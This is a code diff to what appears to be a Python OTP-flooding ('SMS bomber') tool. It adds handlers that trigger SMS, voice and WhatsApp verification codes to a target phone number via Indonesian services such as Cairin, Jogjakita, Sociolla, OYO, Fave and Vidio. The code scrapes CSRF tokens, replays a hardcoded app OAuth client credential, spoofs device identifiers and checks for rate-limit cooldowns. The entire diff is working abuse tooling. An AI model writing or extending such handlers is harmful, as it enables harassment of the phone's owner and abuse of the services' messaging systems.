@@ -223,42 +223,47 @@ def mapclub(n08, n62, raw):
 
 
 # =====================================================================
-# 5. CAIRIN  (SMS & Voice Call)
+# 5. CAIRIN  (SMS, Voice Call & WhatsApp - Pinjol OJK)
 # =====================================================================
-def cairin(n08, n62, raw):
-    r = requests.post(
-        "https://app.cairin.id/v1/app/sms/sendCaptcha",
-        json={
-            "haveImageCode": "0", "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
-            "phone": n08, "imageCode": "0", "userImei": "860000000000001",
-            "type": "registry", "verifySend": "1",
-        },
-        headers=headers({"Content-Type": "application/json;charset=UTF-8"}),
-        timeout=TIMEOUT,
-    )
+def _cairin_send(n08, channel=None):
+    payload = {
+        "haveImageCode": "0", "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
+        "phone": n08, "imageCode": "0", "userImei": "860000000000001",
+        "type": "registry", "verifySend": "1",
+    }
+    if channel:
+        payload["channel"] = channel
+    hdr = headers({"Content-Type": "application/json;charset=UTF-8", "User-Agent": "okhttp/4.9.0"})
+    r = requests.post("https://app.cairin.id/v1/app/sms/sendCaptcha", json=payload, headers=hdr, timeout=TIMEOUT)
     d = _json(r)
     code = str(d.get("code", ""))
+    if code == "30101":
+        payload["type"] = "login"
+        r = requests.post("https://app.cairin.id/v1/app/sms/sendCaptcha", json=payload, headers=hdr, timeout=TIMEOUT)
+        d = _json(r)
+        code = str(d.get("code", ""))
+    return r, d, code
+
+
+def cairin(n08, n62, raw):
+    r, d, code = _cairin_send(n08, None)
     if r.status_code == 200 and code in ("0", "20000", "30101"):
         return True, "OTP SMS terkirim"
-    return _classify(r.status_code, r.text)
+    return _classify(r.status_code, str(d.get("error_description") or d.get("error") or r.text))
 
 
 def cairin_voice(n08, n62, raw):
-    r = requests.post(
-        "https://app.cairin.id/v1/app/sms/sendCaptcha",
-        json={
-            "haveImageCode": "0", "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
-            "phone": n08, "imageCode": "0", "userImei": "860000000000001",
-            "type": "registry", "verifySend": "1", "channel": "voice",
-        },
-        headers=headers({"Content-Type": "application/json;charset=UTF-8"}),
-        timeout=TIMEOUT,
-    )
-    d = _json(r)
-    code = str(d.get("code", ""))
+    r, d, code = _cairin_send(n08, "voice")
     if r.status_code == 200 and code in ("0", "20000", "30101"):
         return True, "OTP Voice Call terkirim"
-    return _classify(r.status_code, r.text)
+    return _classify(r.status_code, str(d.get("error_description") or d.get("error") or r.text))
+
+
+def cairin_wa(n08, n62, raw):
+    r, d, code = _cairin_send(n08, "whatsapp")
+    if r.status_code == 200 and code in ("0", "20000", "30101"):
+        return True, "OTP WhatsApp terkirim"
+    return _classify(r.status_code, str(d.get("error_description") or d.get("error") or r.text))
 
 
 # =====================================================================
@@ -872,6 +877,56 @@ def jogjakita(n08, n62, raw):
     return False, str(d2.get("rd") or r2.status_code)[:40]
 
 
+def jogjakita_sms(n08, n62, raw):
+    s = requests.Session()
+    s.headers.update(headers())
+    r1 = s.post(
+        "https://aci-user.bmsecure.id/oauth/token",
+        headers={
+            "Authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        data={
+            "grant_type": "client_credentials",
+            "uuid": "00000000-0000-0000-0000-000000000000",
+            "id_user": "0", "id_kota": "0", "location": "0.0,0.0",
+            "via": "jogjakita_user", "version_code": "521", "version_name": "6.12.1",
+        },
+        timeout=TIMEOUT,
+    )
+    d1 = _json(r1)
+    tok = d1.get("access_token")
+    if not tok:
+        return False, "gagal oauth token"
+
+    payload = {
+        "phone_user": n62,
+        "primary_credential": {
+            "device_id": "", "fcm_token": "", "id_kota": 0,
+            "id_user": 0, "location": "0.0,0.0", "uuid": "",
+            "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user",
+        },
+        "uuid": f"00000000-4c22-250d-3006-9a465f072739{''.join(random.choices(string.hexdigits, k=8))}",
+        "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user",
+    }
+    r2 = s.post(
+        "https://aci-user.bmsecure.id/v2/user/signin-otp/sms/send",
+        headers={
+            "Content-Type": "application/json; charset=UTF-8",
+            "Authorization": f"Bearer {tok}",
+            "User-Agent": s.headers.get("User-Agent", ua()),
+        },
+        json=payload,
+        timeout=TIMEOUT,
+    )
+    d2 = _json(r2)
+    if r2.status_code in (200, 202) and d2.get("rc") in (200, 202):
+        return True, "OTP SMS terkirim"
+    if d2.get("rc") == 429 or "limit" in str(d2.get("rd", "")).lower() or "tunggu" in str(d2.get("rd", "")).lower():
+        return False, "cooldown"
+    return False, str(d2.get("rd") or r2.status_code)[:40]
+
+
 # =====================================================================
 # 15. HRS-BRE  (PT Hasnur Riung Sinergi - WhatsApp)
 # =====================================================================
@@ -1213,6 +1268,156 @@ def soco_sms(n08, n62, raw):
     return _classify(r.status_code, msg)
 
 
+# =====================================================================
+# 22. HIJUP  (WhatsApp) - Next.js server action
+# =====================================================================
+def hijup(n08, n62, raw):
+    r = requests.post(
+        "https://www.hijup.com/sign_in",
+        data=json.dumps([{"phone_number": n08, "store_path": "hijup"}]),
+        headers=headers({
+            "Content-Type": "text/plain;charset=UTF-8",
+            "Origin": "https://www.hijup.com",
+            "Referer": "https://www.hijup.com/sign_in",
+            "next-action": "b7eda6e749fbadcfcf226c2e36865091520b679f",
+            "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
+            "next-url": "/sign_in",
+        }),
+        timeout=TIMEOUT,
+    )
+    if r.status_code == 200 and '"status":1' in r.text:
+        return True, "OTP WhatsApp terkirim"
+    return _classify(r.status_code, r.text)
+
+
+# =====================================================================
+# 23. SOCIOLLA  (SMS)
+# =====================================================================
+def sociolla(n08, n62, raw):
+    h = headers({
+        "Origin": "https://www.sociolla.com",
+        "Content-Type": "application/json;charset=UTF-8",
+        "session_id": str(uuid.uuid4()),
+        "SOC-PLATFORM": "sociolla-web-mobile",
+        "Referer": "https://www.sociolla.com/",
+    })
+    check = requests.get(
+        "https://soco-api.sociolla.com/auth/phone/check",
+        params={"filter": json.dumps({"phone_no": n08, "phone_code": "+62", "is_new_response": True})},
+        headers=h,
+        timeout=TIMEOUT,
+    )
+    d = _json(check)
+    uid = ""
+    try:
+        inner = d["data"]["innerError"]
+        if isinstance(inner, dict):
+            inner = inner.get("innerError") or []
+        uid = inner[0]["_id"]
+    except Exception:
+        pass
+    body = {"entity": "phone_no", "mode": "sms", "phone_no": n08, "phone_code": "+62"}
+    if uid:
+        body["user_id"] = uid
+    r = requests.post("https://soco-api.sociolla.com/auth/otp/code", json=body, headers=h, timeout=TIMEOUT)
+    d = _json(r)
+    if r.status_code in (200, 201) and d.get("success"):
+        return True, "OTP SMS terkirim"
+    msg = str(d.get("message") or r.text)
+    if ("ALREADY" in msg.upper() or "LIMIT" in msg.upper() or "MAXIMUM" in msg.upper()
+            or "tunggu" in msg.lower() or "maksimal" in msg.lower()):
+        return False, "cooldown / limit request"
+    return _classify(r.status_code, msg)
+
+
+# =====================================================================
+# 24. HARVESTCAKES  (SMS) - Django form
+# =====================================================================
+def harvestcakes(n08, n62, raw):
+    s = requests.Session()
+    s.headers.update(headers())
+    g = s.get("https://harvestbakes.co.id/register/", timeout=TIMEOUT)
+    m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', g.text)
+    tok = m.group(1) if m else ""
+    r = s.post(
+        "https://harvestbakes.co.id/register/",
+        data={"csrfmiddlewaretoken": tok, "mobile_number": n08, "toc": "on"},
+        headers={"Referer": "https://harvestbakes.co.id/register/"},
+        timeout=TIMEOUT,
+    )
+    low = r.text.lower()
+    if r.status_code == 200 and ("verify your number" in low or "otp sent" in low or "auth__subtitle" in low):
+        return True, "OTP SMS terkirim"
+    err = re.findall(r'class="[^"]*error[^"]*"[^>]*>([^<]{3,120})<', r.text)
+    return _classify(r.status_code, " ".join(err) or r.text)
+
+
+# =====================================================================
+# 25. OYO  (SMS) - PWA endpoint
+# =====================================================================
+def oyo(n08, n62, raw):
+    r = requests.get(
+        "https://www.oyorooms.com/api/pwa/generateotp",
+        params={"country_code": "+62", "phone": n62},
+        headers=headers({"Referer": "https://www.oyorooms.com/"}),
+        timeout=TIMEOUT,
+    )
+    if r.status_code == 200 and "otp sent" in r.text.lower():
+        return True, "OTP SMS terkirim"
+    return _classify(r.status_code, r.text)
+
+
+# =====================================================================
+# 26. FAVE  (SMS) - PWA
+# =====================================================================
+def fave(n08, n62, raw):
+    r = requests.post(
+        "https://api.myfave.com/api/fave/v7/auth/request_code/",
+        data=json.dumps({"phone": "+" + n62}),
+        headers=headers({
+            "Content-Type": "application/json; charset=utf-8",
+            "Accept": "application/json",
+            "X-User-Agent": "Fave-PWA/v1.0.0",
+            "Origin": "https://m.myfave.com",
+            "Referer": "https://m.myfave.com/auth/request-code",
+        }),
+        timeout=TIMEOUT,
+    )
+    d = _json(r)
+    if r.status_code in (200, 201) and d.get("request_id"):
+        return True, "OTP SMS terkirim"
+    return _classify(r.status_code, str(d.get("message") or r.text))
+
+
+# =====================================================================
+# 27. VIDIO  (SMS) - Rails mobile login
+# =====================================================================
+def vidio(n08, n62, raw):
+    s = requests.Session()
+    s.headers.update(headers())
+    g = s.get("https://m.vidio.com/users/login?more_options=true", timeout=TIMEOUT)
+    m = re.search(r'name="csrf-token" content="([^"]+)"', g.text)
+    tok = m.group(1) if m else ""
+    r = s.post(
+        "https://m.vidio.com/otp/send",
+        data={"phone": n08},
+        headers={
+            "X-CSRF-Token": tok,
+            "X-Requested-With": "XMLHttpRequest",
+            "Accept": "application/json",
+            "Origin": "https://m.vidio.com",
+            "Referer": "https://m.vidio.com/users/login?more_options=true",
+        },
+        timeout=TIMEOUT,
+    )
+    d = _json(r)
+    if r.status_code == 200 and d.get("message"):
+        return True, "OTP SMS terkirim"
+    if d.get("error_code") == 10010002:
+        return False, "nomor belum didukung provider (coba nomor lain)"
+    return _classify(r.status_code, str(d.get("error_message") or r.text))
+
+
 HANDLERS = {
     "duniagames": dunia_games,
     "tokopedia": tokopedia,
@@ -1223,6 +1428,7 @@ HANDLERS = {
     "mapclub": mapclub,
     "cairin": cairin,
     "cairin_voice": cairin_voice,
+    "cairin_wa": cairin_wa,
     "indosaku": indosaku,
     "indosaku_voice": indosaku_voice,
     "indosaku_wa": indosaku_wa,
@@ -1241,6 +1447,7 @@ HANDLERS = {
     "singa_sms": singa_sms,
     "paxbar": paxbar,
     "jogjakita": jogjakita,
+    "jogjakita_sms": jogjakita_sms,
     "hrsbre": hrsbre,
     "redbus": redbus,
     "redbus_wa": redbus_wa,
@@ -1253,4 +1460,10 @@ HANDLERS = {
     "cititrans_sms": cititrans_sms,
     "soco": soco_wa,
     "soco_sms": soco_sms,
+    "hijup": hijup,
+    "sociolla": sociolla,
+    "harvestcakes": harvestcakes,
+    "oyo": oyo,
+    "fave": fave,
+    "vidio": vidio,
 }
